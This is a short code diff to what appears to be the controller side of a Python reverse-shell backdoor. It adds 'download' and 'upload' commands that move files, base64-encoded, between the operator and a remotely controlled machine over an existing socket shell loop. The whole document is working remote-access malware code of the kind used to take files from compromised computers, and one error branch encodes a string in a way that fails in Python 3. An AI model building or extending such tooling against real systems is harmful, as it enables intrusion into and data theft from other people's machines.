@@ -2,6 +2,7 @@
 
 import socket
 import json
+import base64
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -25,6 +26,17 @@ def shell():
             break
         elif command[:2] == "cd" and len(command) > 1:
             continue
+        elif command[:8] == "download":
+            with open(command[9:], "wb") as file:
+                file_data = reliable_recv()
+                file.write(base64.b64decode(file_data))
+        elif command[:6] == "upload":
+            try:
+                with open(command[7:], "rb") as fin:
+                    reliable_send(base64.b64encode(fin.read()))
+            except:
+                failed = "Failed to upload"
+                reliable_send(base64.b64encode(failed))
         else:
             result = reliable_recv()
             print(result)
